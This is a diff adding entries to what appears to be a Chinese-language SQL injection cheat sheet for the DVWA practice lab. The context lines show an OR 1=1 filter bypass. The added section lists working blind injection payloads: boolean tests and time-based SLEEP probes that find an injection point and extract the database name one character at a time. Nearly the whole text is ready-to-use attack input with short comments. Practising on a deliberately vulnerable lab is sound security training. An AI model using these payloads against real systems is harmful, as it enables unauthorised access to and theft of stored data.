@@ -31,3 +31,16 @@
 # 7. 可选：布尔条件绕过（显示所有记录）
 1' OR 1=1#
 # 说明：使查询返回表中所有记录，可用于绕过简单筛选。
+
+
+# ========== SQL 盲注 (Blind) ==========
+# 布尔盲注
+1' AND 1=1#                      # 判断注入点（存在）
+1' AND 1=2#                      # 判断注入点（缺失）
+1' AND LENGTH(database())=4#     # 猜数据库名长度（dvwa=4）
+1' AND SUBSTRING(database(),1,1)='d'#   # 猜第一个字符
+1' AND ASCII(SUBSTRING(database(),1,1))>100#  # ASCII 猜字符
+
+# 时间盲注
+1' AND IF(1=1, SLEEP(5), 0)#     # 测试延时
+1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)#   # 猜字符延时
